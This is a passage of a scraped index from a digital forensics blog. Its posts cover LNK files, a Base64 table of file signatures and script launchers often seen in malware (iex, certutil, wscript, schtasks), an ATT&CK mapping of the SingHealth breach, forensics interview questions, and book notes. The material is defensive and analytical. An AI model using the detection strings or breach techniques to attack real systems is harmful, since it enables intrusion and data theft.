entries in Harlan Carvey\u0026rsquo;s Windows Incident Response blog: Parsing the Cozy Bear LNK File LNK Files A Minimal LNK LNK Files In The Wild LNK \u0026ldquo;Toolmarks\u0026rdquo; and more\u0026hellip;\nA big thanks to Harlan for recent discussions I had with him on this issue, and his assistance.\nFurther research There is plenty to research in LNK files. For example, what \u0026lsquo;toolmarks\u0026rsquo; (if any) do the various exploitation frameworks produce when they create malicious LNK files? A parallel to the accidental \u0026lsquo;extraneous space\u0026rsquo; that Cobalt Strike placed in the HTTP status response that allowed FOX-IT (and possibly others) to track malicious server infrastructure.\nAnother avenue might be to look at how LNK files are created manually, through the GUI, or through the API and what differences there might be in creation and editing.\nIf you have any ideas, then let me know, either via matt@bitofhex.com or via @mattnotmax. Thanks for reading!\n","id":3,"section":"posts","summary":"LNK files have a healthy life in DFIR. There is good reason: they are so awesome for analysis. Whether it be linking a user to knowledge of a file, as part of a jump list, or in their use for malicious purposes. In regards to the latter, The MITRE ATT\u0026amp;CK framework describes this as the specific technique: \u0026lsquo;shortcut modification\u0026rsquo; (T1023) which is summarised as follows:\n Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.","tags":["lnk files","malware","threat intelligence","cyberchef"],"title":"Deriving intelligence from LNK files","uri":"https://bitofhex.com/2019/07/15/deriving-intelligence-from-lnk-files/","year":"2019"},{"content":"Inspired by a post by John Lambert and others who contributed, I\u0026rsquo;ve put together a table of Base64 encodings for certain file signatures and script elements often encountered in malware analysis.\nDue to the nature of Base64 encoding, there are different possibilities of the encoding result depending on the placement of the bytes in the overall structure of the blob. Using CyberChef all the possible Base64 offsets can be determined. However, in the below tables for ease I\u0026rsquo;ve only included the fixed bytes as if the header was at the start of the blob of Base64.\n For those files that don\u0026rsquo;t have a readable signature, this simple CyberChef recipe will change the hex values to display their Base64 offsets.\n File Signatures File signatures, aka \u0026lsquo;magic bytes\u0026rsquo; or \u0026lsquo;file headers\u0026rsquo;, are static bytes that appear at the start of files.\nFile TypeFile SignatureBase64 EncodingDOS ExecutableMZTVRAR CompressedRar!UmFyIPDF%PDFJVBEROffice/ZipPKUERich Text Format{\\rte1xydCompound Binary File (.doc etc.)D0 CF 11 E0 A1 B1 1A E10M8R4KGxGuGzip1F 8B 08H4sI Common Script Elements These script elements are common leading commands that can be encountered during script analysis.\nScript ElementBase64 EncodinghttpaHR0c$\\x00JAiex (aWV4ICcmd.exe /Y21kLmV4ZSAvcertutilY2VydHV0aWwscriptd3Njcmlwdschtasksc2NodGFza3evalZXZhb  This post was essentially to save a series of Tweets that I found useful. It is not complete and if you want to add further entries please let me know at matt@bitofhex.com or @mattnotmax\n References: File headers: https://www.garykessler.net/library/file_sigs.html Refinement of RTF signature: @decalage2\n","id":4,"section":"posts","summary":"Inspired by a post by John Lambert and others who contributed, I\u0026rsquo;ve put together a table of Base64 encodings for certain file signatures and script elements often encountered in malware analysis.\nDue to the nature of Base64 encoding, there are different possibilities of the encoding result depending on the placement of the bytes in the overall structure of the blob. Using CyberChef all the possible Base64 offsets can be determined. However, in the below tables for ease I\u0026rsquo;ve only included the fixed bytes as if the header was at the start of the blob of Base64.","tags":["malware","cyberchef","encoding"],"title":"Base64 Encoded File Signatures","uri":"https://bitofhex.com/2019/02/19/base64-encoded-signatures/","year":"2019"},{"content":"Background Between August 2017 and July 2018 a suspected APT group gained access to the Singapore Health Services Private Limited (SingHealth) patient database and exfiltrated the personal details of 1.5 million patients including their names, addresses, genders, races, and dates of birth. Of this, 159,000 patients had additional medical data stolen including the Prime Minster of Singapore.\nOn 10 January 2019, a report titled \u0026lsquo;Public Report of the Committee of Inquiry into the Cyber Attack on Singapore Health Services Private Limited’s patient database on or around 27 June 2018\u0026rsquo; was released containing detailed information in regards to the hack and the subsequent incident response activities.\nThe report provides a detailed overview of the movements of the attacker throughout the network and the known actions taken by the group to gain entry, move laterally, steal credentials, access the crown jewels and ultimately exfiltrate a significant amount of sensitive data.\nAn excellent graphical summary is located in the report as follows:\n ATT\u0026amp;CKing the report ATT\u0026amp;CK stands for Adversarial Tactics, Techniques, and Common Knowledge. It is a knowledge base of adversarial techniques. These techniques are organised under a framework of tactics: Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Exfiltration, and Command and Control.\nBy combining the report information and mapping ATT\u0026amp;CK techniques we can observe where the attack could have been identified. We can then apply this to our own networks and ultimately learn from this data breach to strengthen ourselves.\nIn order to maintain accuracy, I will be quoting directly from the report referenced above and from the ATT\u0026amp;CK knowledge base. Due to the flow of the report and the style of breach, some tactics will be grouped together.\n Initial Access \u0026amp; Execution The initial access tactic represents the vectors adversaries use to gain an initial foothold within a network.\nExecution represents techniques that result in execution of adversary-controlled code on a local or remote system. This tactic is often used in conjunction with initial access as the means of executing code once access is obtained.\nKey Report Quotes:\n\u0026lsquo;\u0026hellip;while not conclusive, there is some evidence to suggest that the initial intrusion was through a successful phishing attack, which led to malware being installed and executed on the workstation\u0026hellip;The publicly available hacking tool was installed on Workstation A on 1 December 2017 by exploiting a vulnerability in the version of Microsoft Outlook\u0026hellip;\u0026rsquo; (p. 54 \u0026amp; 55)\n\u0026lsquo;The tool was thus successfully installed and was used to download malicious files onto Workstation A. Some of these files were masqueraded as .jpg image files, but in fact contained malicious PowerShell scripts, one of which is thought to be a modified PowerShell script taken from an open source post-exploitation tool.\u0026rsquo; (p. 55)\n\u0026lsquo;With the introduction of the hacking tool and RAT 1 in December 2017, the attacker gained the capability to execute shell scripts remotely, as well as to upload and download files to Workstation A.\u0026rsquo; (p. 56)\nIdentified ATT\u0026amp;CK Techniques:\nT1193 - Spearphishing Attachment OR T1192 - Spearphishing Link (see update below) T1078 - Valid Accounts T1086 - PowerShell T1204 - User Execution T1137 - Office Application Startup T1064 - Scripting\nComment:\nPhishing is split into multiple categories in ATT\u0026amp;CK including: Spearphishing Attachment and Spearphishing Link.\nATT\u0026amp;CK states: \u0026lsquo;Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.\u0026rsquo;\nThe malware noted above has been suggested to exploit CVE 2017-11774 and assessed to use a publicly available tool, Ruler. Where Ruler fits in to the ATT\u0026amp;CK framework is a bit murky because it is both persistence and the shell. I have included T1137; however, the notes on the ATT\u0026amp;CK knowledge base don\u0026rsquo;t mention this kind of technique.\n14/01/2019 UPDATE\nThe phishing vector has been changed to Valid Accounts. Nick Car (@itsreallynick) corrected me as follows: \u0026lsquo;I also personally don\u0026rsquo;t believe there was any phishing here. Singapore Health report mentioned they couldn\u0026rsquo;t pin down initial infection and assumed it was phish.\u0026rsquo;\nHe pointed me totheir blog detailing FireEye expierence with the Ruler exploit:\n\u0026lsquo;FireEye has observed and documented an uptick in several malicious attackers\u0026rsquo; usage of this specific home page exploitation technique. Based on our experience, this particular method may be more successful due to defenders misinterpreting artifacts and focusing on incorrect mitigations. This is understandable, as some defenders may first learn of successful CVE-2017-11774 exploitation when observing Outlook spawning processes resulting in malicious code execution. When this observation is combined with standalone forensic artifacts that may look similar to malicious HTML Application (.hta) attachments, the evidence may be misinterpreted as initial infection via a phishing email. This incorrect assumption overlooks the fact that attackers require valid credentials to deploy CVE-2017-11774, and thus the scope of the compromise may be greater than individual users\u0026rsquo; Outlook clients where home page persistence is discovered.\u0026rsquo;\n Persistence Persistence is any access, action, or configuration change to a system that gives an adversary a persistent presence on that system.\nKey Report Quotes:\n\u0026lsquo;A variety of custom web shells, tools, and unique malware were used in the attack\u0026hellip;Remote Access Trojans, such as the abovementioned RAT 1 and RAT 2, were used to provide the attacker with full control over specific infected systems and to serve as backdoors to re-enter the network.\u0026rsquo; (p. 93\n\u0026lsquo;IHiS’ investigations revealed that the attacker had gained administrative privileges and moved across the network to access the Citrix servers. This was an indication that the KRBTGT account could have been compromised.\u0026rsquo; (p. 192)\nIdentified ATT\u0026amp;CK Techniques:\nT1137 - Office Application Startup T1078 - Valid Accounts T1097 - Pass the Ticket\nComment:\nThe report does not detail any specific persistence mechanisms other than the exploited Outlook vulnerability that allowed the actor to drop further malware and enabled remote access. This malware (unnamed RATs) then simply stole/dumped credentials which allowed them to use valid accounts to move throughout the network.\nThe KRBTGT account was reset twice as per standard practice on the assessment that it had been compromised.\n Privilege Escalation \u0026amp; Credential Access Privilege escalation is the result of actions that allows an adversary to obtain a higher level of permissions on a system or network.\nCredential access represents techniques resulting in access to or control over system, domain, or service credentials that are used within an enterprise environment. Adversaries will likely attempt to obtain legitimate credentials from users or administrator accounts to use within the network.\nKey Report Quotes:\n\u0026lsquo;The log file was a remnant file from a known malware which has password dumping capability.\u0026rsquo; (p. 55)\n\u0026lsquo;Investigations have revealed at least two possibilities of how the attacker obtained the password for the L.A. account\u0026hellip;Second, the credentials to the L.A. account were found to be reflected in clear-text on a batch file on Citrix Server 1. It is possible that the attacker had first achieved access to the file system of the Citrix server, and then accessed this file and obtained the credentials.\u0026rsquo; (p. 59)\n\u0026lsquo;CSA has observed that the attacker could have acquired the credentials to the [service account] account through the malware it used.\u0026rsquo; (p. 60)\n\u0026lsquo;CSA’s analysis of the SCM application showed that there were signs of insecure coding practices, giving rise to a vulnerability that was likely exploited by the attacker to obtain the credentials to the A.A. account.\u0026rsquo; (p. 86)\n\u0026lsquo;The FY16 H-Cloud Pen-Test revealed that administrator credentials were found in network shares. A Citrix administrator password was also found in a Windows batch file. The implication of this was that attackers having access to such files, or with physical or network access to shared folders, could read this sensitive information and further use it to perform enhanced focused attacks.\u0026rsquo; (p. 89)\n\u0026lsquo;The penetration testers uncovered that the Citrix virtualisation environment used was not configured adequately to prevent attackers from breaking out of the virtualisation and into the underlying operating system. Exploiting the vulnerability allowed the penetration testers to access files and execute arbitrary commands. CSA’s hypothesis is that this vulnerability could have been the means by which the attacker gained initial access to the file system of any of the compromised SGH Citrix servers\u0026hellip;the vulnerability continued to be exploitable for the SGH Citrix servers at the time of the Cyber Attack\u0026rsquo; (p. 90 \u0026amp; 91)\nIdentified ATT\u0026amp;CK Techniques:\nT1078 - Valid Accounts T1081 - Credentials in Files T1003 - Credential Dumping T1068 - Exploitation for Privilege Escalation\nComment:\nWhether or not the local administrator password was accessed from the batch file is moot as the password was \u0026lsquo;P@ssw0rd\u0026rsquo;, which would have been cracked almost immediately.\nWhat is most interesting is that the attackers likely exploited a coding vulnerability to access the so-called AA account. This AA account was the \u0026lsquo;last mile\u0026rsquo; that allowed them to access the medical records.\n Defensive Evasion Defense evasion consists of techniques an adversary may use to evade detection or avoid other defenses.\nKey Report Quotes:\n\u0026lsquo;The Citrix system event log for Citrix Server 1 was also deleted in the evening of 11 June 2018\u0026hellip; The deletion was not performed by any IHiS staff. It was presumably done by the attacker to cover its tracks.\u0026rsquo; (p. 62 \u0026amp; 63)\n\u0026lsquo;The Citrix Team also discovered on 26 June 2018 that the Windows event logs for Citrix Servers 2 and 3 were deleted earlier that afternoon. This was further evidence of malicious activity.\u0026rsquo; (p. 147)\n\u0026lsquo;\u0026hellip;during the incident response, malware samples were given a cybersecurity company to develop malware signatures. The firm’s software was initially unable to detect the samples as being malicious. After CSA shared their initial malware analysis findings with the company, it was able to develop malware signatures in their antivirus solution for mass network-wide scanning.\u0026rsquo; (p. 93)\nThe attacker employed advanced tactics, techniques, and procedures, as seen from the suite of advanced, customised and stealthy malware used\u0026hellip;the attacker was conscientious in erasing logs on compromised workstations and servers. Notably, the attacker even re-entered the network after being detected, to erase system and program logs.\u0026rsquo; (p. 95)\nIdentified ATT\u0026amp;CK Techniques:\nT1070 - Indicator Removal on Host T1066 - Indicator Removal from Tools\nComment:\nATT\u0026amp;CK notes that, \u0026lsquo;\u0026hellip;adversaries performing actions related to account management, account logon and directory service access, etc. may choose to clear the events in order to hide their activities.\u0026rsquo;\nIn regards to the malware, the report notes that it wasn\u0026rsquo;t picked up on the AV. This leads to the hypothesis that the attackers knew what sort of AV was deployed and potentially modified malware to suit the environment and circumvent AV detection. This in itself is another technique (T1063) Security Software Discovery.\n Discovery \u0026amp; Lateral Movement Discovery consists of techniques that allow the adversary to gain knowledge about the system and internal network.\nLateral movement consists of techniques that enable an adversary to access and control remote systems on a network\nKey Report Quotes:\n\u0026lsquo;Evidence of the attacker’s lateral movements was found in the proliferation of malware across a number of endpoints and servers\u0026hellip;There was also evidence of PowerShell commands used by the attacker to distribute malware to infect other machines, and of malicious files being copied between machines over mapped network drives. These were clear indicators that the attacker had moved laterally around the network.\u0026rsquo; (.p 57)\nThe \u0026lsquo;\u0026hellip;reconstruction of events show that the attacker had moved laterally using RDP to remotely access multiple SGH Citrix servers. This was done from compromised workstations and suspected virtual machines, and by using compromised user credentials.\u0026rsquo; (p. 77)\nIdentified ATT\u0026amp;CK Techniques: T1105 - Remote File Copy T1086 - PowerShell T1076 - Remote Desktop Protocol\nWhile not specific, the report identifies \u0026lsquo;Remote File Copy\u0026rsquo; and \u0026lsquo;Powershell\u0026rsquo; as two techniques that are noted in ATT\u0026amp;CK. In regards to Remote File Copy, \u0026lsquo;[a]dversaries may also copy files laterally between internal victim systems to support Lateral Movement with remote Execution using inherent file sharing protocols such as file sharing over SMB to connected network shares\u0026hellip;\u0026rsquo;\nIn regards to RDP, ATT\u0026amp;CK notes, \u0026lsquo;[a]dversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials.\u0026rsquo;\n Collection, Exfiltration \u0026amp; Command and Control Collection consists of techniques used to identify and gather information, such as sensitive files, from a target network prior to exfiltration.\nExfiltration refers to techniques and attributes that result or aid in the adversary removing files and information from a target network.\nCommand and Control represents how adversaries communicate with systems under their control within a target network.\nKey Report Quotes:\n\u0026lsquo;From 27 June to 4 July 2018, the data was exfiltrated by the attacker via Workstation A to the attacker’s C2 servers\u0026hellip;\u0026rsquo; (p. 68)\n\u0026lsquo;\u0026hellip;the C2 servers were used for\u0026hellip;Infection: where the server is used as a means of dropping malware into the system it is trying to infect\u0026hellip;Data exfiltration: there were indications of technical data (and not medical records) being sent to the servers and\u0026hellip;Beacon: infected machines may have connected to C2 servers to establish a ‘heartbeat’ (p. 94)\nIdentified ATT\u0026amp;CK Techniques:\nT1074 - Data Staged T1041 - Exfiltration Over Command and Control Channel\nComment\nThe report is a bit thin on the more sensitive parts including the C2 infrastructure. ATT\u0026amp;CK notes in T1041, \u0026lsquo;Data exfiltration is performed over the Command and Control channel. Data is encoded into the normal communications channel using the same protocol as command and control communications.\u0026rsquo; The report does not state if the protocol and encoding was the same between the C2 commands and exfiltration.\n Summary A total of 16 ATT\u0026amp;CK techniques were identified from a (non-comprehensive) review of the report.\nT1193 - Spear phishing Attachment (unlikely - see update above) T1192 - Spear phishing Link - (unlikely - see update above) T1086 - PowerShell T1204 - User Execution T1137 - Office Application Startup T1064 - Scripting T1078 - Valid Accounts T1097 - Pass the Ticket T1081 - Credentials in Files T1003 - Credential Dumping T1068 - Exploitation for Privilege Escalation T1070 - Indicator Removal on Host T1066 - Indicator Removal from Tools T1076 - Remote Desktop Protocol T1074 - Data Staged T1041 - Exfiltration Over Command and Control Channel\nSo how can this be used? Well, the best place to start is with experts. I\u0026rsquo;d recommend watching the following presentation by Steve Motts and Christian Kopacsi which explains why ATT\u0026amp;CK is so important and how to strengthen your defence by using ATT\u0026amp;CK:\n   Following that, some useful links and information is referenced at SneakyMonkey\u0026rsquo;s Blue Team Tips here.\nFinal Caveat The report is 425 pages, and presumably doesn\u0026rsquo;t cover all the information. I\u0026rsquo;ve probably skipped some important bits. However, that\u0026rsquo;s not the main purpose of this post (although the breach itself is very interesting). What is important is that there are at least 16 identified ATT\u0026amp;CK techniques from this breach alone. So while these reports are interesting, don\u0026rsquo;t dismiss them as not relevant to your environment - using the ATT\u0026amp;CK knowledge base means that we can learn from these real-world examples.\nAs usual, if you have any comments, corrections or issues, drop me a line at matt@bitofhex.com or via Twitter at @mattnotmax. Thanks for reading!\n","id":5,"section":"posts","summary":"Background Between August 2017 and July 2018 a suspected APT group gained access to the Singapore Health Services Private Limited (SingHealth) patient database and exfiltrated the personal details of 1.5 million patients including their names, addresses, genders, races, and dates of birth. Of this, 159,000 patients had additional medical data stolen including the Prime Minster of Singapore.\nOn 10 January 2019, a report titled \u0026lsquo;Public Report of the Committee of Inquiry into the Cyber Attack on Singapore Health Services Private Limited’s patient database on or around 27 June 2018\u0026rsquo; was released containing detailed information in regards to the hack and the subsequent incident response activities.","tags":["ATT\u0026CK","incident response"],"title":"ATT\u0026CKing the Singapore Health Data Breach","uri":"https://bitofhex.com/2019/01/12/attack-and-singapore-breach/","year":"2019"},{"content":"Interviews are tough, and digital forensics jobs in law enforcement don\u0026rsquo;t come up very often. So how do you prepare? Getting a job in #DFIR is a common thread and I thought I\u0026rsquo;d add my thoughts as well as some possible interview questions specific to law enforcement. Even if these questions don\u0026rsquo;t remotely come up in your actual interview, the key for success is preparation. So thinking about these questions will put you in good stead for a role.\nAs a background, I used to work as a civilian for a law enforcement agency in various roles. The last one being as a Digital Forensic Examiner. This post represents my views alone.1\nPhoto by Thomas Kvistholt / Unsplash General Thoughts First, I understand some people don\u0026rsquo;t like the police. Some people have undergone life changing, destructive, hurtful, or terrible experiences in their dealings with police. Others simply could never see themselves working for the law enforcement, or are not interested in the role. I understand. This post is not for you.\nFor others who are considering applying or working for law enforcement (or any government agency), I recommend researching and understanding the kind of work you might be doing. Police roles vary in states, provinces, and countries and therefore the types of DF work will also vary. A good way to understand what role you might have is to look at the legislation the agency enforces. It is local or federal? Is is community policing? Is it immigration or border policing? Is it aligned with customs or tax enforcement? Don\u0026rsquo;t think you\u0026rsquo;re going to catch murderers and serial killers when your agency only looks after narcotics and people trafficking. You\u0026rsquo;ll be disappointed.\nLaw enforcement is hierarchical and has a chain of command. You can be told what to do, and as long as the order is within policies and legal, then you have little scope to refuse the request. Likewise, problems and issues are fed up through the chain of command. They are not flat, agile organisations, and that is something you might have to get used to.\nBut it\u0026rsquo;s not all gloom and doom. The work is incredibly varied, the training is often excellent, as a specialist you\u0026rsquo;ll have good autonomy, and the pace can be fast.\nInterview Questions These are some questions I would consider for an interview. Some are junior questions and some are more senior. I\u0026rsquo;m going to mix them up because they can be adjusted for either type of interview. I see no purpose in tricking people in an interview, it\u0026rsquo;s a short time someone has to evaluate your skills, not to stumble over tricky questions you spent weeks scheming. Hence, some questions might seem simplistic - but the purpose is to stimulate discussion.\nI\u0026rsquo;m not putting any specific answers here but rather my thoughts on why I think certain questions are important.\nPhoto by Daniel McCullough / Unsplash Communication Skills In my opinion, DFIR is a great deal more about having decent communication skills than technical skills. For law enforcement (as with most jobs) you need the ability to be able to succinctly and accurately communicate both written and verbal information to a wide range of audiences.\nQ: Explain \u0026lt;insert basic IT concept\u0026gt; to someone who has never used it? (For example: email, a hard drive, the internet, SMS, SnapChat, a web-browser etc.)\nThis might sound trite but there are plenty of people (cough judges cough) who have limited exposure to computers. To some, \u0026lsquo;basic\u0026rsquo; computing functions are akin to quantum physics. Being able to explain an \u0026lsquo;everyday\u0026rsquo; computing activity in basic terms is essential for testifying in court.\nI wouldn\u0026rsquo;t be looking for detail, but for the essential concepts being explained accurately without jargon. More senior positions could include explaining more DF specific topics such as a write-blocker, an E01 file, or a hash.\nWant to ace the question? Answer using a simple and accurate analogy that your grandmother could understand.\nQ: Tell me about some written technical work you have produced? Who was the audience? How do you tailor your document to your audience?\nThings like an executive summary (for busy prosecutors), diagrams (for bored juries) and timelines (for everyone) make technical documents bearable.\nQ: What\u0026rsquo;s more important in written and verbal communication: accuracy of information or timeliness?\nMost people will say \u0026lsquo;both\u0026rsquo;, which is true (in my opinion), but can you think of a time when one out weighs the other?\n\nGeneral Technical Knowledge Q: What is a hash, and how is it used in digital forensics?\nDepending on the answer this could lead to all sorts of follow up questions which will provide insight into the level of maturity of the DF examiner. Follow up questions could examine hash collisions, what to do in the event of a hash mismatch, types of hashing used for evidence acquisition, and when hashes would be verified.\nQ: How would you test if a write-blocker worked?\nGoogle \u0026lsquo;known sample\u0026rsquo;. Work the rest out.\nQ (junior): Explain what happens when a user moves a file to the recycle bin.\nDon\u0026rsquo;t have experience? Download FTK Imager. Put a file on the desktop. Move it to the Recycle Bin. Look at Recycle Bin in FTK Imager. Explain what happened.\nQ (senior): Explain what happens when a user deletes a file on an NTFS file system?\nThere can be a lot in this answer. Start with File System Forensics by Brian Carrier.\nQ: On an NTFS file system, explain the difference between file created, file modified, MFT modified, and file accessed?\nQ: Where on a Windows system could you find evidence of a file being opened by a user?\nThis question could also be modified to any artefacts from the SANS \u0026lsquo;Evidence of\u0026hellip;\u0026rsquo; poster.\nQ: You are examining a hard drive and have a keyword hit for the url http://www.example.com in unallocated space. Explain what analysis you would do next.\nThis is pretty open ended. For me it would be trying to put context around the keyword hit. If context can\u0026rsquo;t be made, then reporting with the appropriate caveats.\nQ: What are some anti-forensics methods you might encounter on computer systems (e.g. laptops, desktop computers)?\nPhoto by Rami Al-zayat / Unsplash Mobile Phones Law Enforcement have to deal with a lot of phones. So expect questions relating to mobile phones, especially for senior positions.\nQ: Explain the difference between a logical, file system and physical extraction of a mobile phone.\nQ: You are given a phone and asked for all location data relating to Los Angeles Airport. Explain how you would conduct your analysis.\nI\u0026rsquo;m looking for a basic method. Thinking about what phone data might meet the requirements and how you might go about extracting it.\nQ: A police investigator walks in, hands you a mobile phone and says \u0026ldquo;all the evidence is in the chat program\u0026rdquo;. They then walk out. What do you do next?\nOK, terrible chain of custody aside, it is somewhat common you get evidence but little further information. Don\u0026rsquo;t get flustered and forget basic examination procedures. Be calm, examine the phone as normal giving priority to the chat programs.\nQ (follow up): OK, you extracted the phone with a physical extraction using Product A. But only one of the chat programs has been recognised and parsed out. The key evidence is not there. What do you do next?\nLooking for some understanding of the main data structures of mobiles (hint).\nQ: You\u0026rsquo;re given a locked iPhone. What do you do?\nDon\u0026rsquo;t go technical straight away. Remember, it\u0026rsquo;s the police - have you asked for the PIN? It might sound stupid, but the case officer might simply not know that you can\u0026rsquo;t easily bypass iPhone PINs.\nIf you don\u0026rsquo;t have the PIN then start asking some other questions: \u0026ldquo;Is the phone on?\u0026rdquo; \u0026ldquo;Has it been switched off since it was seized by police?\u0026rdquo; \u0026ldquo;Do we have any other computer hardware belonging to the owner?\u0026rdquo; \u0026ldquo;Have any pass-codes been tried already?\u0026rdquo;\nOK, now start talking about technical bypasses. I\u0026rsquo;m not going to list them because it depends heavily of the iPhone and iOS version as well as specific settings.\nQ: What are some ways someone can hide data on a mobile phone?\nOr similar to above, asking about anti-forensics capabilities of a phone.\n\nNon-Traditional Skills Q: You\u0026rsquo;re called to a search warrant where there is one desktop computer switched on. Chrome is open with over 25 tabs and you can see something downloading. Explain how you would examine the computer.\nHang on? Shouldn\u0026rsquo;t this be in technical skills? In fact, how someone conducts a live examination is so varied the actual process is less important (to me) than someone who covers the following:\nFirst, I\u0026rsquo;m looking for someone not to panic. Don\u0026rsquo;t jump in and cycle through tabs, or look to see what is downloading. They\u0026rsquo;re red herrings.\nSecond, I\u0026rsquo;m looking for someone to ask some follow-up questions: \u0026ldquo;What is the search warrant for?\u0026quot;2 \u0026ldquo;Is there a time limit for the examination?\u0026rdquo; \u0026ldquo;Can you provide any more information on the owner of the computer?\u0026rdquo; \u0026ldquo;Has anyone touched the computer since police arrived?\u0026rdquo; In fact, any questions are good questions, because this replicates what I would expect you to ask if you were really there.\nThird, somewhere in your answer you need to talk about documenting the scene (and/or contemporaneous notes). Photos, video, notes, voice recorder, etched into stone tablets\u0026hellip;it doesn\u0026rsquo;t matter how, but before you do anything and while you are examining, you need to document your actions.\nFourth, OK,now you can collect your memory!\nQ: You\u0026rsquo;ve been working a long day, there is no-one else in the office. While examining a mobile phone you swipe an email and it moves it to the trash bin in the mail app. You haven\u0026rsquo;t extracted the phone yet. What do you do?\nAgain, it\u0026rsquo;s not the specific action but the overall process that is important. Document the action. Take photos. The criticality of the evidence and the specifics of the error would inform if the mistake is reported or simply put in your notes. Just don\u0026rsquo;t cover it up. Shit happens.\n\nEthics \u0026amp; Values Any interview will should contain some questions about ethics, your values, anti-corruption. Be prepared. Some questions could be:\nQ: You are offered $1,000 by a suspect not to do a complete examination of a mobile phone - what do you do?\nQ: What would you do if you suspect a colleague is corruptly involved in a investigation?\nQ: A colleague tells you \u0026lsquo;not to examine this hard drive\u0026rsquo; before removing it from the lab and walking off. What are your next immediate actions?\nQ: Your having a beer with some work mates and other non-police friends, a work colleague starts talking about a current narcotics investigation. What do you do?\nQ: You\u0026rsquo;re examining a mobile phone and see WhatsApp communication between the owner of the phone and your brother-in-law. What do you do?\nNo answers here. This is on you. But be prepared for follow-up questions nailing down exactly the steps or actions you might take.\nPhoto by Evan Dennis / Unsplash General Themes If you\u0026rsquo;ve read this far (and apologies for the length of the post) then you can hopefully see some themes in my questions and answers. Many questions are open ended and rely on you asking follow-up questions or the answers stimulating a discussion. This is because you need to have the confidence to ask questions: the who, what, where, when, and why of the evidence. The police investigator might have some or all of the answers, or they might be able to get the answer. But often you\u0026rsquo;ll need to ask those questions to progress your analysis.\nWhat questions to ask comes with experience, just like asking the right questions is important in an IR engagement, or for a SOC analyst.\nGood luck in your job hunt. If you have any questions or comments please contact me via matt@bitofhex.com or @mattnotmax.\n  No, I can\u0026rsquo;t get you a job. Really. \u0026#x21a9;\u0026#xfe0e;\n Ideally you would know this but\u0026hellip; \u0026#x21a9;\u0026#xfe0e;\n   ","id":6,"section":"posts","summary":"Interviews are tough, and digital forensics jobs in law enforcement don\u0026rsquo;t come up very often. So how do you prepare? Getting a job in #DFIR is a common thread and I thought I\u0026rsquo;d add my thoughts as well as some possible interview questions specific to law enforcement. Even if these questions don\u0026rsquo;t remotely come up in your actual interview, the key for success is preparation. So thinking about these questions will put you in good stead for a role.","tags":["learning"],"title":"Digital Forensics Interviews: Law Enforcement Edition","uri":"https://bitofhex.com/2018/11/07/starting-in-digital-forensics-law-enforcement-edition/","year":"2018"},{"content":"Great sources of DFIR information are endless: books, blogs, repositories, Twitter, lectures, conferences, and journals. One of the hardest skills I am yet to master is transferring this huge amount of information into digestible and searchable chunks. At the moment my \u0026lsquo;system\u0026rsquo; consists mainly of a stack of printouts, endless Twitter bookmarks, 75 open Chrome tabs, and sticky notes with Excel formulae (generally different ways to convert Unix epochs to a readable format en mass\u0026hellip;).\nSo, I thought to change tack from my usual path and try mind mapping. It was inspired by a tweet from Jack Crook (@jackcr)\nIf you want to start dynamically detecting beacon traffic, it may help to define characteristics of a beacon. Not all will look the same, but will likely share some similarities with others. Can you cluster characteristics and surface unknown? #ThreatHunting #DFIR pic.twitter.com/OhRqr7F3O0\n\u0026mdash; Jack Crook (@jackcr) May 4, 2018   My initial task was a Volatility mind map. The result is this first cut of a high-level command reference:\n The Volatility framework is so large and memory forensics so vast, I\u0026rsquo;ll probably expand this so each node has key command switches and contextual summaries, but as I work through the book it\u0026rsquo;s been a great way to really think about how different commands relate to one another. There are endless ways that it could also be visualised, which makes mind mapping such an interesting and memorable way of learning.\nA higher quality PDF copy is available on GitHub. While it\u0026rsquo;s available, I highly encourage you to develop your own mind map: as with all \u0026lsquo;cheat sheets\u0026rsquo; it\u0026rsquo;s not really the end result, but the process of synthesising information into smaller chunks that makes the system work.\nIf you\u0026rsquo;ve got a way to learn, study, remember, or reference please let me know at matt@bitofhex.com or via Twitter (which I\u0026rsquo;ll probably just bookmark) at @mattnotmax.\n","id":7,"section":"posts","summary":"Great sources of DFIR information are endless: books, blogs, repositories, Twitter, lectures, conferences, and journals. One of the hardest skills I am yet to master is transferring this huge amount of information into digestible and searchable chunks. At the moment my \u0026lsquo;system\u0026rsquo; consists mainly of a stack of printouts, endless Twitter bookmarks, 75 open Chrome tabs, and sticky notes with Excel formulae (generally different ways to convert Unix epochs to a readable format en mass\u0026hellip;).","tags":["memory forensics","learning"],"title":"Mind Mapping Volatility","uri":"https://bitofhex.com/2018/09/11/mind-mapping-volatility/","year":"2018"},{"content":"So many people recommend \u0026lsquo;The Cuckoo\u0026rsquo;s Egg\u0026rsquo; as a must-read for information security professionals. For those in the dark, the book follows the author Cliff Stoll tracking unauthorised access to the US Lawrence Berkeley National Laboratory computer network in the late 1980s.\n The book itself is an engaging and fascinating account of a low-tech attacker (by today\u0026rsquo;s standards) penetrating various networks across the US and the low-tech defender tracking his activities. Cliff\u0026rsquo;s use of 1980s technology to frustrate and degrade the attacker is sometimes hilarious (e.g. jangling his keys to literally introduce random noise on the wire).\nSome of the quotes I took away from the book could be said today without any question:\n The hacker didn\u0026rsquo;t succeed through sophistication. Rather he poked at obvious places, trying to enter through unlocked doors. Persistence, not wizardry, let him through. \u0026lsquo;The Cuckoo\u0026rsquo;s Egg\u0026rsquo;, Chapter 20, p. 126.\n This is the most amazing part about the Cuckoo\u0026rsquo;s Egg: the majority of the principles that Cliff Stoll used to monitor, analyse, and eventually track down his adversary are the same today. The parallels are so stark that Chris Sanders put together an eight week course following the book and drawing out the information security principles. Chris bills the course as an introduction to information security; and while that is accurate, it\u0026rsquo;s also a great way to deeply explore the book and its legacy today.\nThe course covers a wide range of modern topics which Chris summarises in the final week:\n For those of us who often get the question: \u0026lsquo;What do you do all day?\u0026rsquo; or \u0026lsquo;Can you hack my Facebook account?\u0026rsquo; or even better \u0026lsquo;How do I get to do your job?\u0026rsquo; I\u0026rsquo;d recommend giving him/her a copy of the book and then pointing them to the course which is generously available for free on Vimeo.\nFor all of Chris\u0026rsquo;s hard work, I have to plug his books and courses and thank him for his work.\nI always love book recommendations. Here are mine (so far), please let me know if you have any for me at @mattnotmax or matt@bitofhex.com.\n","id":8,"section":"posts","summary":"So many people recommend \u0026lsquo;The Cuckoo\u0026rsquo;s Egg\u0026rsquo; as a must-read for information security professionals. For those in the 